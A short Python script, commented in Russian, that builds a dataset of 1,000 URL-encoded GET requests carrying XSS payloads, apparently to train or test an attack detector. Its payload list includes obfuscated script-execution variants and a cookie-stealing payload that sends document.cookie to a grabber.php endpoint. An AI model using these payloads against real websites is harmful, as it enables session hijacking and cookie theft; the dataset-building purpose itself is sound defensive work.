import random
import json
import urllib.parse

# Примеры XSS-атак
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<iframe src='javascript:alert(1)'>",
    "<body onload=alert('XSS')>",
    "<svg onload=alert(1)>",
    "\"><script>alert('XSS')</script>",
    "<script>eval('\\x61lert(\\'33\\')')</script>",
    "<div onpointerover=\"alert(45)\">MOVE HERE</div>",
    "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>",
    "Function(\"ale\"+\"rt(1)\")();",
    "setTimeout('ale'+'rt(2)');"
]

# Пути для запросов
paths = ["/order", "/search", "/cart", "/checkout", "/login", "/products", "/wishlist", "/api"]
params = [
    "book", "shoes", "electronics", "laptop", "phone", 
    "apple", "banana", "category1", "username1", "password123",
    "query", "search_term", "action1", "value1"
]

def generate_get_requests(num_requests):
    requests = []
    
    for _ in range(num_requests):
        # Выбираем случайный payload из списка
        payload = random.choice(xss_payloads)
        
        # Кодируем payload в URL
        encoded_payload = urllib.parse.quote(payload)
        
        # Создаем GET-запрос с закодированным payload
        request = f"{random.choice(paths)}?{random.choice(params)}={encoded_payload}"
        requests.append(request)
    
    return requests

# Генерация GET-запросов
num_get_queries = 1000

get_requests = generate_get_requests(num_get_queries)

# Сохранение в файл строками
with open("xss_dataset.txt", "w") as file:
    for request in get_requests:
        file.write(request + "\n")

print(f"Сгенерировано  запросов (GET и POST), сохранено в 'xss_dataset.json'.")
